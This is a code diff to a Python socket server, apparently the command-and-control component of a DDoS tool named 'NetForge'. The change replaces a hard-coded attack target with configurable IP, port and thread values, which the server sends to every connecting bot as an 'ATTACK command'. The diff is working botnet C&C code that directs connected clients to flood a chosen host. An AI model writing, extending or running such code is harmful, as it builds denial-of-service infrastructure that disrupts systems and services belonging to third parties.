@@ -9,13 +9,14 @@ from threading import Thread
 """
 class NonBlockingServer():
 
-    def __init__(self, port: int, bind_address: str = '0.0.0.0', read_buf_size: int = 1024):
+    def __init__(self, port: int, bind_address: str = '0.0.0.0', read_buf_size: int = 1024, def_msg = ''):
         self.port          : str = port
         self.bind_address  : str = bind_address
         self.read_buf_size : int = read_buf_size
         self.clients       : list[socket.socket] = [] # client sockets
         self.event_thread  : Thread | None = None
         self.__stop_flag = False
+        self.def_msg = def_msg
 
 
     def start(self, blocking: bool = False) -> bool:
@@ -92,7 +93,8 @@ class NonBlockingServer():
         self.clients.append(new_sock)
         (ip, port) = addr # or new_sock.getpeername()
         print(f'[+] New client connected. ({ip}:{port})')
-        new_sock.send('10.10.0.2:111:5'.encode('utf-8'))
+        new_sock.send(self.def_msg.encode('utf-8'))
+        print('[*] Sent ATTACK command! --> ', self.def_msg)
 
 
     def _read_handler(self, sock: socket.socket, sel: selectors.BaseSelector):
@@ -118,8 +120,8 @@ class NonBlockingServer():
 
 
 class NetForge_DDoS_CNC_Server():
-    def __init__(self):
-        self.server = NonBlockingServer(1984) # default port
+    def __init__(self, ip: str, port: int, threads: int):
+        self.server = NonBlockingServer(1984, def_msg=f'{ip}:{port}:{threads}') # default port
 
     def start(self):
         print('[*] Start the C&C (Command & Control) server...')
